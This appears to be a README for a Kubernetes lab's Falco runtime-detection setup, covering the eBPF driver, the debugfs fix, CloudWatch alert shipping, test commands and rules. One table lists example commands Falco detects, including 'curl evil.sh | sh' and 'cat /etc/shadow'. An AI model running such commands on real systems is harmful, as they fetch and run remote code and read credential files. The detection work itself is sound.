# Runtime threat detection (Falco)

[Falco](https://falco.org) watches the kernel's **syscalls** and alerts on
suspicious runtime behaviour — installed as a Helm release by
[`terraform/cluster/falco.tf`](../terraform/cluster/falco.tf).

## Why — the gap the audit log can't fill

The API-server audit log (`/k8s/webapp/audit`) records that someone `exec`'d into
a pod and the *launch* command, but once exec upgrades to a streaming TTY the API
server sees nothing more — **not the commands typed inside the shell, not the
output.** Falco taps `execve` at the kernel, so it sees the shell **and every
command run after it**. That's the whole reason it's here.

| Layer | Sees |
| --- | --- |
| k8s audit (`/k8s/webapp/audit`) | *"system:admin exec'd `bash` into webapp"* |
| **Falco (`/k8s/falco`)** | **`cat /etc/shadow`, `id`, `curl evil.sh \| sh` — the commands inside** |

Falco is **observe-only** (like Trivy Operator): it writes alerts, it never
blocks. It complements Gatekeeper (which blocks at admission).

## Driver: modern eBPF (+ the k3d debugfs catch)

Falco uses the **modern eBPF (CO-RE)** probe — no kernel headers or module
builds. It needs BTF (present on kernel 6.x) and, on **k3d**, one extra thing:

> **k3d nodes don't mount `debugfs`.** Without it the BPF probe can't resolve
> syscall tracepoint IDs and Falco captures *nothing* (you'll see
> `failed to determine tracepoint ... perf event ID` in the logs). So the lab
> mounts it on the node:
> - **fresh cluster:** `null_resource.falco_debugfs` in `falco.tf` mounts it before Falco installs.
> - **after a reboot** (it's on tmpfs, lost on restart — like flannel's `subnet.env`): `scripts/recover.sh` re-mounts it and bounces Falco. `make reboot` covers it.

## Placement

- Runs in its **own `falco` namespace** — the webapp-scoped Gatekeeper constraints
  don't apply, so its privileged DaemonSet is admitted (same as ESO / the shipper).
- Low footprint: no vuln DB, no image pulls beyond the Falco image — none of the
  disk-pressure risk Trivy Operator's scan jobs carry.

## Alerts → CloudWatch

Falco writes JSON alerts to stdout. The `cloudwatch-log-shipper` DaemonSet tails
the Falco pod log and ships it to a **`/k8s/falco`** log group, exactly like the
app and audit streams (see [`logging/cloudwatch-log-shipper.yaml`](../logging/cloudwatch-log-shipper.yaml)):

```
/var/log/pods/falco_*/falco/*.log  ->  /k8s/falco
```

## Test it

### 1. Trigger a detection

Run some commands inside the webapp container. No TTY needed — the custom
**"Command run in webapp container"** rule fires on *every* process:

```bash
KC="kubectl --context k3d-webapp-test"
POD=$($KC get pods -n webapp -o jsonpath='{.items[0].metadata.name}')
$KC exec -n webapp "$POD" -- sh -c 'id; cat /etc/hostname; ls /'
```

### 2. See it in Falco (live, in-cluster)

```bash
kubectl --context k3d-webapp-test logs -n falco -l app.kubernetes.io/name=falco -c falco -f | grep --line-buffered -iE 'webapp|shell'
```

You get one JSON alert **per command** — rule `Command run in webapp container`,
`k8s.ns.name=webapp`, and the exact `proc.cmdline` for `sh -c ...`, `id`,
`cat /etc/hostname`, `ls /` — plus a `Terminal shell in container` alert if you
used `-it`.

### 3. See it shipped to floci CloudWatch (`/k8s/falco`)

```bash
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_EC2_METADATA_DISABLED=true; unset AWS_PROFILE
EP="aws --endpoint-url=http://localhost:4566 --region us-east-1 --no-cli-pager"
sleep 12   # shipper batches every ~5s
$EP logs filter-log-events --log-group-name /k8s/falco --start-time $(( ($(date +%s)-300)*1000 )) --query 'reverse(events)[].message' --output text | tr '\t' '\n' | python3 -c 'import sys,json,re
for l in sys.stdin:
    m = re.sub(r"^\S+ \w+ \w ", "", l.strip())   # strip CRI prefix: <ts> stdout F
    try: d = json.loads(m)
    except Exception: continue
    of = d.get("output_fields", {})
    print(d.get("time","")[:19], "|", d.get("rule"), "|", of.get("k8s.ns.name"), of.get("k8s.pod.name"), "|", of.get("proc.cmdline"))
'
```

Example output — every command, not just the shell:
```
2026-07-17T23:25:11 | Command run in webapp container | webapp webapp-xxxx | id
2026-07-17T23:25:11 | Command run in webapp container | webapp webapp-xxxx | cat /etc/hostname
2026-07-17T23:25:11 | Command run in webapp container | webapp webapp-xxxx | ls /
```

> **If `/k8s/falco` is empty right after a Falco restart:** the shipper's `tail -F`
> binds to the Falco pod's log path at startup, so after Falco is re-rolled
> (upgrade/reboot) give the shipper a nudge: `kubectl rollout restart
> ds/cloudwatch-log-shipper -n logging`. `make reboot` already re-nudges Falco.

> No TTY? A non-interactive `kubectl exec pod -- ls` won't trip the *shell* rule
> (it needs `proc.tty != 0`). Use `-it`, or `script -qec "kubectl exec -it ..." /dev/null`
> to force a pty from a non-interactive shell.

### Rules

Two things fire on exec activity here:

| Rule | Fires on | Source |
| --- | --- | --- |
| `Terminal shell in container` | a shell **spawn** with a TTY | Falco default ruleset |
| `Command run in webapp container` | **every process** in the `webapp` namespace | baked into `falco.tf` (`customRules`) |

The default rule alone logs only that a shell opened — **not the commands typed
after it**, which is the whole reason Falco is here. The custom rule
(`spawned_process and container and k8s.ns.name = webapp`) closes that: one alert
per command. It's **noisy by design** (every exec in webapp); for real use, scope
it further or exclude known process names. Edit it in
[`terraform/cluster/falco.tf`](../terraform/cluster/falco.tf).

The default ruleset also catches: reading sensitive files (`/etc/shadow`),
writing below `/etc` or binary dirs, package-manager launches, outbound
connections to unexpected ports.

## Where this fits the security story

- **Block at PR** — trivy Gate 4 (image CVEs).
- **Block at admission** — Gatekeeper (insecure pods).
- **Observe images at runtime** — Trivy Operator (what's deployed).
- **Observe *behaviour* at runtime** — **Falco** (what a process actually does).

Maps to NIST **SI-4** (system monitoring) and **AU-2/AU-12** (audit of the
in-container activity the API audit log can't see).
